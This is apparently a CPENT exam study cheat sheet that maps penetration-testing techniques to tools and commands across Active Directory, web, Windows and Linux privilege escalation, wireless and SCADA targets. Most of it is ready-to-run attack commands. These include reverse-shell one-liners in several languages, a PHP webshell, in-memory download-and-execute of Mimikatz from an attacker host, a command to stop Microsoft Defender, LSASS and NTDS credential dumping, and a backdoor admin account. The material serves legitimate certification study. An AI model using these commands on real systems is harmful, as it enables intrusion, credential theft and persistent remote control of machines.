# 18 - TOOLS AND TECHNIQUES MAP

**Credits**  
Zeeshan  
GitHub: https://github.com/mzeeshanzafar28  
LinkedIn: https://www.linkedin.com/in/mzeeshanzafar28  

Quick-lookup reference for every technique you'll need during the CPENT exam. Find the technique in the left column, grab the command in the middle column.

---

## 1. QUICK-LOOKUP: TECHNIQUE → TOOL MATRIX

### Port Scanning & Host Discovery

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| TCP port scan | nmap | masscan, rustscan | `nmap -sS -Pn -p- TARGET` |
| UDP port scan | nmap | unicornscan | `nmap -sU --top-ports 200 TARGET` |
| Service version detection | nmap | amap | `nmap -sV -p PORT TARGET` |
| OS detection | nmap | p0f | `nmap -O TARGET` |
| ARP host discovery | nmap | netdiscover, arp-scan | `nmap -PR -sn SUBNET` |
| ICMP host discovery | nmap | fping | `nmap -PE -sn SUBNET` |
| TCP ACK ping | nmap | hping3 | `nmap -PA80,443 -sn TARGET` |
| Firewall evasion (fragment) | nmap | hping3 | `nmap -f --mtu 24 TARGET` |
| Source port spoofing | nmap | hping3 | `nmap --source-port 53 TARGET` |
| Zombie/Idle scan | nmap | — | `nmap -sI ZOMBIE_IP TARGET` |
| Decoy scan | nmap | — | `nmap -D RND:10 TARGET` |
| Timing control | nmap | — | `nmap -T2 TARGET` (slow/stealthy) |
| Scan IP list | nmap | — | `nmap -iL targets.txt` |
| Aggressive scan | nmap | — | `nmap -A TARGET` |
| Passive OS fingerprint | p0f | — | `p0f -i eth0` |
| ARP discovery (live hosts) | netdiscover | arp-scan | `netdiscover -r 192.168.1.0/24` |
| Packet capture/analysis | tcpdump | Wireshark, tshark | `tcpdump -i eth0 -w capture.pcap` |

### SMB / NetBIOS Enumeration

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| SMB share enumeration | crackmapexec | smbclient, enum4linux | `crackmapexec smb TARGET --shares` |
| SMB null session check | crackmapexec | smbclient | `crackmapexec smb TARGET -u '' -p '' --shares` |
| SMB share access | smbclient | — | `smbclient //TARGET/Share -U user` |
| SMB vulnerability scan | nmap | — | `nmap --script smb-vuln* -p 445 TARGET` |
| MS17-010 (EternalBlue) | nmap / Metasploit | — | `nmap --script smb-vuln-ms17-010 -p 445 TARGET` |
| NetBIOS name scan | nbtscan | nmap nse | `nbtscan SUBNET` |
| RID cycling / user enum | enum4linux | crackmapexec | `enum4linux -U TARGET` |
| GPP password extraction | crackmapexec | manual smbclient | `crackmapexec smb TARGET -u USER -p PASS -M gpp_password` |
| SMB signing check | crackmapexec | nmap | `crackmapexec smb SUBNET --gen-relay-list relay.txt` |

### LDAP Enumeration

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| LDAP anonymous bind | ldapsearch | nmap | `ldapsearch -x -H ldap://DC_IP -b "DC=DOMAIN,DC=local"` |
| LDAP domain dump | ldapdomaindump | bloodhound-python | `ldapdomaindump -u DOMAIN\\user -p pass DC_IP` |
| BloodHound collection | bloodhound-python | SharpHound (on-host) | `bloodhound-python -c All -u USER -p PASS -d DOMAIN -dc DC_IP -ns DC_IP` |
| AD user enumeration | crackmapexec | kerbrute | `crackmapexec smb DC_IP -u USER -p PASS --users` |

### Kerberos Attacks

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Kerberoasting | impacket-GetUserSPNs | Rubeus (on-host) | `impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/user:pass` |
| AS-REP Roasting | impacket-GetNPUsers | Rubeus | `impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP` |
| Kerberoast hash cracking | hashcat | john | `hashcat -m 13100 hash.txt rockyou.txt` |
| AS-REP hash cracking | hashcat | john | `hashcat -m 18200 hash.txt rockyou.txt` |
| Golden Ticket | impacket-ticketer | mimikatz | `impacket-ticketer -domain-sid SID -domain DOMAIN Administrator` |
| Silver Ticket | impacket-ticketer | mimikatz | `impacket-ticketer -spn cifs/DC.DOMAIN -domain-sid SID ...` |
| DCSync | impacket-secretsdump | mimikatz | `impacket-secretsdump DOMAIN/Administrator@DC_IP` |

### Password Attacks

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Password spraying | crackmapexec | hydra, kerbrute | `crackmapexec smb SUBNET -u users.txt -p 'Spring2024!'` |
| SMB brute force | hydra | crackmapexec, medusa | `hydra -L users.txt -P pass.txt smb://TARGET` |
| SSH brute force | hydra | crackmapexec, medusa | `hydra -L users.txt -P pass.txt ssh://TARGET` |
| NTLM hash cracking | hashcat | john | `hashcat -m 1000 ntlm.txt rockyou.txt` |
| Net-NTLMv2 cracking | hashcat | john | `hashcat -m 5600 hash.txt rockyou.txt` |
| Password audit | L0phtCrack | — | GUI: import hashes → audit |
| GPP decrypt | gpp-decrypt | — | `gpp-decrypt CPASSWORD_VALUE` |
| Responder (capture hashes) | responder | — | `sudo responder -I eth0` |
| NTLM relay | impacket-ntlmrelayx | — | `impacket-ntlmrelayx -tf targets.txt -smb2support` |

### Web Application

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Web tech fingerprint | whatweb | wappalyzer | `whatweb http://TARGET` |
| Directory brute force | gobuster | ffuf, dirb, dirbuster | `gobuster dir -u http://TARGET -w wordlist.txt` |
| Subdomain discovery | ffuf | gobuster, subfinder | `ffuf -u http://FUZZ.TARGET -w subdomains.txt` |
| WordPress scan | wpscan | — | `wpscan --url http://TARGET -e ap,at,u` |
| SQL injection | sqlmap | havij | `sqlmap -u "http://TARGET/page?id=1" --dbs` |
| Web proxy / interception | Burp Suite | ZAP | GUI: intercept → modify → forward |
| Web vulnerability scan | wmap (Metasploit) | OpenVAS, Nessus | `load wmap; wmap_sites -a URL; wmap_targets -t URL; wmap_run -t; wmap_run -e` |
| CGI scanning | nikto | — | `nikto -h http://TARGET` |
| File upload testing | Burp Suite | curl | Intercept upload → modify extension/content-type |
| Cookie/session manipulation | Burp Suite | browser dev tools | Intercept → modify cookie values |
| Reverse shell payload gen | msfvenom | webshells, weevely | `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw` |
| Webshell | custom / kali webshells | weevely | Upload: `<?php system($_GET['cmd']); ?>` |

### Pivoting & Tunneling

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Reverse SOCKS proxy | Chisel | ligolo-ng | Server: `./chisel server -p 8000 --reverse` / Client: `./chisel client KALI_IP:8000 R:1080:socks` |
| SSH dynamic forward | SSH | — | `ssh -D 1080 -N -f user@TARGET` |
| SSH ProxyJump | SSH | — | `ssh -J user@pivot user@internal` |
| Meterpreter autoroute | Metasploit | — | `run post/multi/manage/autoroute SUBNET=10.10.10.0/24` |
| Meterpreter SOCKS | Metasploit | — | `use auxiliary/server/socks_proxy; set SRVPORT 1080; run` |
| Proxy-aware scanning | proxychains | — | `proxychains nmap -sT -Pn TARGET` |
| HTTP tunnel | HTTPort/HTTHost | — | Set up HTTP tunnel through firewall |

### Privilege Escalation — Linux

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Automated enumeration | LinPEAS | LinEnum, linux-smart-enum | `./linpeas.sh` |
| SUID binary exploitation | GTFOBins (reference) | manual | `find / -perm -4000 -type f 2>/dev/null` |
| Sudo misconfiguration | GTFOBins (reference) | manual | `sudo -l` |
| Kernel exploit check | linux-exploit-suggester | — | `./linux-exploit-suggester.sh` |
| Cron job abuse | manual | pspy | `cat /etc/crontab; ls -la /etc/cron*` |
| Capabilities check | manual | — | `getcap -r / 2>/dev/null` |
| Writable passwd/shadow | manual | — | `ls -la /etc/passwd /etc/shadow` |
| Docker breakout | deepce | GTFOBins | `./deepce.sh` |
| PATH hijacking | manual | — | `find / -writable -type d 2>/dev/null` |

### Privilege Escalation — Windows

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Automated enumeration | WinPEAS | PrivescCheck, Seatbelt | `winPEAS.exe` |
| Service misconfiguration | PowerUp.ps1 | manual sc query | Check: unquoted paths, writable services |
| Token impersonation | JuicyPotato / PrintSpoofer | RoguePotato | `PrintSpoofer.exe -i -c cmd` (if SeImpersonate) |
| AlwaysInstallElevated | PowerUp.ps1 | registry check | `reg query HKLM\SOFTWARE\Policies\...\AlwaysInstallElevated` |
| UAC bypass | UACMe | fodhelper bypass | Various Akagi methods |
| Credential dumping | mimikatz | — | `sekurlsa::logonpasswords` |
| SAM/SYSTEM dump | reg save | mimikatz | `reg save hklm\sam sam; reg save hklm\system sys` |
| LSASS dump | procdump | Task Manager (GUI) | `procdump.exe -ma lsass.exe lsass.dmp` |
| Scheduled tasks | schtasks | PowerUp | `schtasks /query /fo LIST /v` |

### Active Directory Lateral Movement

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| WinRM shell | evil-winrm | Enter-PSSession | `evil-winrm -i TARGET -u USER -p PASS` |
| Pass-the-Hash (WinRM) | evil-winrm | — | `evil-winrm -i TARGET -u USER -H NTLM_HASH` |
| PSExec | impacket-psexec | Metasploit psexec | `impacket-psexec DOMAIN/user:pass@TARGET` |
| WMIexec | impacket-wmiexec | — | `impacket-wmiexec DOMAIN/user:pass@TARGET` |
| SMBexec | impacket-smbexec | — | `impacket-smbexec DOMAIN/user:pass@TARGET` |
| Pass-the-Ticket | impacket (with ccache) | Rubeus | `export KRB5CCNAME=ticket.ccache` then use impacket with `-k` |
| Overpass-the-Hash | Rubeus | impacket-getTGT | `Rubeus.exe asktgt /user:USER /rc4:NTLM /ptt` |
| IPv6 DNS poisoning | mitm6 + ntlmrelayx | — | `mitm6 -d DOMAIN` + `ntlmrelayx.py -6 -t smb://TARGET` |

### Binary Analysis & Debugging

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| File type identification | file | — | `file binary` |
| Strings extraction | strings | rabin2 -z | `strings binary` |
| Disassembly | objdump | radare2, gdb | `objdump -d -M intel binary` |
| Binary info | rabin2 | readelf | `rabin2 -I binary` |
| Debugging (Linux) | gdb (with peda) | edb | `gdb binary` then `disassemble main` |
| Debugging (Windows) | Immunity Debugger | x64dbg, edb | GUI: open binary → run |
| Pattern create (fuzzing) | Metasploit | — | `pattern_create.rb -l 3000` |
| Pattern offset | Metasploit | — | `pattern_offset.rb -q 0xVALUE` |
| Gadget finder (ROP) | ropper | ROPgadget | `ropper -f binary --search "jmp esp"` |
| Shellcode generation | msfvenom | — | `msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f python -b '\x00'` |
| Stack canary check | checksec | pwntools | `checksec --file=binary` |
| Address sanitizer | ASan (gcc/clang) | — | Compile with `-fsanitize=address` |
| Java decompiler | jadx | jd-gui | `jadx-gui binary.apk` |

### Firmware & IoT

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Firmware file analysis | file | — | `file firmware.bin` |
| Binary inspection | binwalk | — | `binwalk firmware.bin` |
| Firmware extraction | binwalk | — | `binwalk -e firmware.bin` |
| Hex dump | hexdump / xxd | — | `hexdump -C firmware.bin \| head` |
| Filesystem identification | file + binwalk | — | Identify squashfs, cramfs, jffs2 |
| Firmware emulation | firmadyne | QEMU | `firmadyne` suite (configure firmadyne.conf first) |
| UART/serial access | screen / minicom | — | `screen /dev/ttyUSB0 115200` |
| Firmware download sources | vendor sites | OTA capture | NetGear, TP-Link etc. host firmware publicly |

### Wireless

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Monitor mode enable | airmon-ng | — | `airmon-ng start wlan0` |
| Packet capture | airodump-ng | — | `airodump-ng wlan0mon` |
| Target network scan | airodump-ng | — | `airodump-ng --bssid MAC -c CHANNEL -w capture wlan0mon` |
| Deauth attack | aireplay-ng | mdk4 | `aireplay-ng -0 10 -a BSSID wlan0mon` |
| Handshake crack | aircrack-ng | hashcat | `aircrack-ng -w rockyou.txt capture.cap` |
| WPA cracking (GPU) | hashcat | — | `hashcat -m 22000 capture.hc22000 rockyou.txt` |
| Automated wireless attack | wifite | airgeddon, fluxion | `wifite` (interactive) |
| Evil twin attack | airgeddon | fluxion | `airgeddon` (menu-driven) |

### OT / SCADA

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| Passive traffic capture | Wireshark / tcpdump | — | `tcpdump -i eth0 -w scada.pcap port 502` |
| Modbus device discovery | nmap nse | Metasploit | `nmap --script=modbus-discover.nse -p 502 TARGET` |
| Modbus Unit ID find | Metasploit | modbus-cli | `use auxiliary/scanner/scada/modbus_findunitid` |
| Modbus register read | Metasploit | modbus-cli | `use auxiliary/scanner/scada/modbusclient` |
| SCADA enumeration (safe) | nmap | — | `nmap -n -sT -T2 -p 502 --open SUBNET` |
| SCADA network mapping | GrassMarlin | Nipper Studio | GUI-based passive network mapping |
| Shodan SCADA search | Metasploit | shodan CLI | `use auxiliary/gather/shodan_search; set QUERY scada` |
| Modbus master emulation | QModMaster | — | GUI: set IP, port 502, Unit ID |
| Modbus slave emulation | Modbus-Pal | — | GUI: configure registers |

### Credential Dumping & Hash Extraction

| Technique | Primary Tool | Alternative Tools | Quick Command |
|-----------|-------------|-------------------|---------------|
| LSASS memory dump | mimikatz | procdump | `sekurlsa::logonpasswords` |
| SAM database dump | impacket-secretsdump | reg save + pwdump | `impacket-secretsdump LOCAL` or `impacket-secretsdump DOMAIN/user@TARGET` |
| NTDS.dit extraction | impacket-secretsdump | ntdsutil | `impacket-secretsdump -just-dc-ntlm DOMAIN/Administrator@DC` |
| Browser saved passwords | LaZagne | custom scripts | `laZagne.exe browsers` |
| DPAPI decryption | mimikatz | — | `dpapi::masterkey` then `dpapi::cred` |
| Linux shadow file | unshadow + john | hashcat | `unshadow passwd shadow > combined; john combined` |

### Reverse Shells (Quick Reference)

| Protocol | Command |
|----------|---------|
| **Bash** | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| **Netcat** | `nc -e /bin/bash IP PORT` |
| **Netcat (no -e)** | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc IP PORT >/tmp/f` |
| **Python** | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| **PHP** | `<?php system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); ?>` |
| **PowerShell** | `powershell -c "$client=New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535\|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 \| Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` |

---

## 2. POWERSHELL MODULE — COMPLETE REFERENCE

### PowerShell Fundamentals

PowerShell is Windows' built-in automation framework. It operates on objects (not text), can interact with the Windows API, execute in-memory shellcode, and manage Active Directory — all without dropping files to disk ("living off the land").

**Core Concepts:**
- Verb-Noun syntax: `Get-Process`, `Sort-Object`, `Set-ExecutionPolicy`
- Object-oriented pipeline: pipe objects, not text strings
- Access to .NET Framework, WMI, COM, RPC
- Can manage cloud services (Azure)

### Bypassing Execution Policy

By default, Windows sets the execution policy to `Restricted`. This prevents custom `.ps1` scripts from running — but it is NOT a security boundary.

```powershell
# Bypass when launching PowerShell from cmd.exe:
powershell -ExecutionPolicy bypass

# Bypass from inside a PowerShell session:
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope Process

# Bypass using encoded command:
powershell -EncodedCommand <BASE64_ENCODED_COMMAND>
```

### Essential Enumeration Cmdlets

```powershell
# Check current execution policy
Get-ExecutionPolicy

# Search for available commands
Get-Command -Name *process*
Get-Command -Name *service*
Get-Command -Name *aduser*

# Get help on any cmdlet
Get-Help Get-Process
Get-Help Get-Service -Examples

# List files and directories (like ls/dir)
Get-ChildItem C:\Users
Get-ChildItem -Recurse -Filter "*.txt"

# Read a file (like cat)
Get-Content C:\Windows\System32\drivers\etc\hosts
Get-Content C:\inetpub\wwwroot\web.config

# List running services
Get-Service
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-Service | Where-Object {$_.Name -like "*sql*"}

# Kill a process (disable AV if high privileges)
Stop-Process -Name "MsMpEng" -Force
Stop-Process -Id 1234 -Force

# List running processes
Get-Process
Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 10

# Network information
Get-NetIPAddress
Get-NetIPConfiguration
Get-NetRoute
Test-NetConnection -ComputerName 10.10.10.5 -Port 445

# Check firewall rules
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'}
```

### Local User & Group Enumeration (Legacy `net` Commands)

These legacy commands are fast, reliable, and available in almost any Windows shell:

```powershell
# List all local users
net user

# Show details for a specific user
net user Administrator

# Show password policy
net accounts

# List all local groups
net localgroup

# Show members of a group
net localgroup Administrators
net localgroup "Remote Desktop Users"

# Create a local user (if you have privileges)
net user hacker Password123! /add
net localgroup Administrators hacker /add
```

### Active Directory Enumeration Cmdlets

```powershell
# Import AD module (if available on the host)
Import-Module ActiveDirectory

# List all domain users
Get-ADUser -Filter *

# Get specific user details
Get-ADUser Administrator -Properties *

# List all domain groups
Get-ADGroup -Filter *

# Get members of Domain Admins
Get-ADGroupMember "Domain Admins"

# List all domain computers
Get-ADComputer -Filter *

# Find user SPNs (for Kerberoasting — without dropping tools)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Search for accounts that don't require Kerberos pre-auth (AS-REP Roasting candidates)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### Download & Execute (Living Off the Land)

```powershell
# Download a file from attacker's HTTP server
Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\Windows\Temp\nc.exe

# Alternative download methods:
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/tool.exe', 'C:\Windows\Temp\tool.exe')
certutil -urlcache -f http://10.10.14.5/tool.exe C:\Windows\Temp\tool.exe

# Execute after download
Start-Process C:\Windows\Temp\nc.exe -ArgumentList '10.10.14.5 4444 -e cmd'

# In-memory download and execute (no disk write):
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
```

### PowerShell Reverse Shell (One-Liner)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Useful On-the-Fly Scripts

```powershell
# Quick network sweep (ping equivalent)
1..254 | ForEach-Object { Test-Connection 192.168.1.$_ -Count 1 -Quiet }

# Quick port scan from PowerShell
$ports = 22,80,443,445,3389,5985
$target = "10.10.10.5"
foreach ($p in $ports) {
    $tcp = New-Object Net.Sockets.TcpClient
    $result = $tcp.BeginConnect($target, $p, $null, $null)
    $success = $result.AsyncWaitHandle.WaitOne(1000)
    if ($success) { Write-Host "Port $p OPEN" }
    $tcp.Close()
}

# Find files containing "password"
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Select-String "password" | Select-Object -First 20

# Export running services for offline analysis
Get-Service | Export-Csv C:\Windows\Temp\services.csv
```

---

## 3. SPECIALIZED TOOL REFERENCE

### WMAP (Web Scanner in Metasploit)

```bash
msfconsole
msf6 > load wmap
msf6 > wmap_sites -a http://TARGET_IP
msf6 > wmap_targets -t http://TARGET_IP
msf6 > wmap_run -t          # Check which modules will run
msf6 > wmap_run -e          # Execute the scan
msf6 > wmap_vulns -l        # List discovered vulnerabilities
```

### Advanced Scanning & Reconnaissance Tools

| Tool | Purpose | Quick Usage |
|------|---------|-------------|
| **DMitry** | All-in-one recon (subdomains, email, port scan) | `dmitry -winsep TARGET` |
| **p0f** | Passive OS fingerprinting (zero packets sent) | `p0f -i eth0` |
| **tcpdump** | CLI packet capture | `tcpdump -i eth0 -w capture.pcap host TARGET` |
| **rpcinfo** | Query RPC portmapper (port 111) | `rpcinfo -p TARGET` |
| **showmount** | List NFS exports | `showmount -e TARGET` |
| **mount** | Mount NFS/SMB shares | `mount -t nfs TARGET:/share /mnt -o nolock` |
| **nbtscan** | NetBIOS name resolution over UDP 137 | `nbtscan 192.168.1.0/24` |

### Password & Credential Tools

| Tool | Purpose | Quick Usage |
|------|---------|-------------|
| **Cain & Abel** | Windows MITM/ARP poisoning, password recovery | GUI-based, Windows |
| **L0phtCrack** | Windows password audit, NTLM cracking | GUI-based, import hashes |
| **evil-winrm** | PowerShell remote shell via WinRM (5985) | `evil-winrm -i TARGET -u USER -p PASS` |
| **Searchsploit** | Offline Exploit-DB search | `searchsploit wordpress`, `searchsploit -m 12345` |
| **Havij** | Legacy SQL injection GUI tool | GUI-based (Windows), database dumping |
| **Spynotes** | Android RAT/malware | Used for mobile device access research |
| **Address Sanitizer (ASan)** | Memory corruption detection | `gcc -fsanitize=address binary.c` |
| **Veil** | AV-evading payload generator | Generates obfuscated payloads |
| **Weevely** | Stealthy PHP webshell | `weevely generate password shell.php` |

### Firmware Analysis Workflow

```bash
# 1. Identify firmware
file firmware.bin
# → firmware.bin: Squashfs filesystem or data

# 2. Inspect with binwalk
binwalk firmware.bin
# → Shows embedded files, filesystems, compression

# 3. Extract
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# 4. Explore extracted filesystem
ls -la
find . -type f -name "*.conf" -o -name "*.xml" -o -name "*.json"
grep -rn "password" .
grep -rn "admin" .
cat etc/shadow
cat etc/passwd

# 5. Look for command injection in CGI scripts
grep -rn "system\|exec\|popen\|eval" . --include="*.cgi" --include="*.sh" --include="*.lua"

# 6. Emulate with firmadyne or QEMU
```

### OT/SCADA Protocol Filters

```bash
# Modbus (TCP 502)
tcpdump -i eth0 port 502 -w modbus_capture.pcap
wireshark modbus_capture.pcap   # Decodes Modbus packets automatically

# Wireshark display filters for SCADA:
modbus                    # All Modbus traffic
modbus.func_code == 3     # Read Holding Registers
modbus.func_code == 6     # Write Single Register
!(modbus.func_code == 3)  # Exclude read operations
tcp.port == 502           # All port 502 traffic

# Safe active scan for Modbus devices:
nmap -n -sT -T2 -p 502 --open 10.10.10.0/24
nmap --script=modbus-discover.nse -p 502 TARGET_IP
```

---

## 4. COMMAND-LINE CHEAT SHEETS

### Nmap Scan Types at a Glance

```bash
# Host discovery
nmap -sn SUBNET           # Ping sweep (no port scan)
nmap -PR SUBNET           # ARP scan (same subnet only)
nmap -PE -sn TARGET       # ICMP echo
nmap -PS80,443 -sn TARGET # TCP SYN to common ports
nmap -PA80,443 -sn TARGET # TCP ACK to common ports
nmap -PU -sn TARGET       # UDP probe

# Port scanning
nmap -sS TARGET           # SYN stealth (default, needs raw sockets)
nmap -sT TARGET           # TCP connect (works through proxies)
nmap -sU TARGET           # UDP scan
nmap -sX -p PORT TARGET   # XMAS scan
nmap -sN TARGET           # NULL scan
nmap -sF TARGET           # FIN scan

# Service/OS detection
nmap -sV TARGET           # Version detection
nmap -sV --version-intensity 9  # Aggressive versioning
nmap -O TARGET            # OS detection
nmap -A TARGET            # Aggressive (OS + version + scripts + traceroute)

# Timing templates (0=paranoid, 1=sneaky, 2=polite, 3=normal, 4=aggressive, 5=insane)
nmap -T2 TARGET           # Slow, evasive (use for OT/SCADA)
nmap -T4 TARGET           # Fast (use when speed matters)

# Firewall evasion
nmap -f TARGET            # Fragment packets
nmap --mtu 24 TARGET      # Custom MTU
nmap -D RND:10 TARGET     # Decoy scan
nmap --source-port 53 TARGET  # Source port spoofing
nmap --data-length 200 TARGET # Append random data

# Output
nmap -oA scan_results TARGET  # All formats
nmap -oN normal.txt -oX xml.xml -oG grepable.txt TARGET
```

### CrackMapExec at a Glance

```bash
# SMB enumeration
crackmapexec smb 10.10.10.0/24                           # Discover SMB hosts
crackmapexec smb TARGET -u '' -p '' --shares             # Null session
crackmapexec smb TARGET -u user -p pass --shares         # Authenticated shares
crackmapexec smb TARGET -u user -p pass --users          # Enumerate users
crackmapexec smb TARGET -u user -p pass --groups         # Enumerate groups
crackmapexec smb TARGET -u user -p pass --pass-pol       # Password policy
crackmapexec smb TARGET -u user -p pass --sessions       # Active sessions

# Password spraying
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# Hash passing
crackmapexec smb TARGET -u Administrator -H NTLM_HASH

# Module execution
crackmapexec smb TARGET -u user -p pass -M gpp_password
crackmapexec smb TARGET -u user -p pass -M mimikatz
crackmapexec smb TARGET -u user -p pass -M lsassy

# Command execution (if admin)
crackmapexec smb TARGET -u Administrator -p pass -x 'whoami'
crackmapexec smb TARGET -u Administrator -p pass -X 'powershell -enc ...'
```

### Impacket Quick Reference

```bash
# Kerberos attacks
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/user:pass
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -request

# Credential dumping
impacket-secretsdump DOMAIN/Administrator@DC_IP              # Remote DCSync
impacket-secretsdump -just-dc-ntlm DOMAIN/Administrator@DC_IP  # NT hashes only
impacket-secretsdump LOCAL -sam sam -system sys              # Local SAM dump

# Lateral movement
impacket-psexec DOMAIN/user:pass@TARGET                      # Interactive shell
impacket-wmiexec DOMAIN/user:pass@TARGET                     # WMI shell
impacket-smbexec DOMAIN/user:pass@TARGET                     # SMB shell
impacket-atexec DOMAIN/user:pass@TARGET 'command'            # Scheduled task

# Ticket attacks
impacket-ticketer -domain-sid SID -domain DOMAIN Administrator

# NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t ldaps://DC_IP -smb2support --escalate-user attacker

# Miscellaneous
impacket-GetADUsers DOMAIN/user:pass -dc-ip DC_IP             # User enumeration
impacket-mssqlclient DOMAIN/user:pass@TARGET -windows-auth     # MSSQL client
impacket-rpcdump TARGET -p 135                                 # RPC endpoint mapper
```

### Hashcat Hash Modes

| Hash Type | Mode | Example Command |
|-----------|------|----------------|
| NTLM | 1000 | `hashcat -m 1000 ntlm.txt rockyou.txt` |
| NetNTLMv2 | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberos TGS (Kerberoast) | 13100 | `hashcat -m 13100 kerb.txt rockyou.txt` |
| Kerberos AS-REP | 18200 | `hashcat -m 18200 asrep.txt rockyou.txt` |
| WPA/WPA2 | 22000 | `hashcat -m 22000 wpa.hc22000 rockyou.txt` |
| SHA-256 | 1400 | `hashcat -m 1400 hash.txt rockyou.txt` |
| MD5 | 0 | `hashcat -m 0 hash.txt rockyou.txt` |
| Linux shadow (sha512crypt) | 1800 | `hashcat -m 1800 shadow.txt rockyou.txt` |

---

## 5. PROXYCHAINS CONFIGURATION

Edit `/etc/proxychains.conf`:

```bash
# Uncomment:
dynamic_chain

# Comment out:
# strict_chain

# Add at bottom:
[ProxyList]
socks4 127.0.0.1 1080

# For double pivot:
[ProxyList]
socks4 127.0.0.1 1080    # First hop
socks4 127.0.0.1 1081    # Second hop
```

**Critical proxychains rules:**
- Use `proxychains` (not `proxychains4`) on Kali
- Only `-sT` (TCP connect) scans work through SOCKS
- No SYN scans, no ICMP, no UDP through SOCKS
- Always test the tunnel first: `proxychains nc -nv INTERNAL_IP 445`

---

## 6. METASPLOIT QUICK COMMANDS

```bash
msfconsole -q                         # Quiet start
search smb                            # Search modules
use exploit/windows/smb/NAME          # Select module
show options                          # Show parameters
set RHOSTS TARGET_IP                  # Set target
set LHOST YOUR_IP                     # Set listener
set LPORT 4444                        # Set port
show payloads                         # Show compatible payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp # Set payload
check                                 # Verify vulnerability
exploit                               # Run exploit
sessions -l                           # List sessions
sessions -i 1                         # Interact with session
background                            # Background session (Ctrl+Z)
```

---

**End of 18-TOOLS-AND-TECHNIQUES-MAP.md**
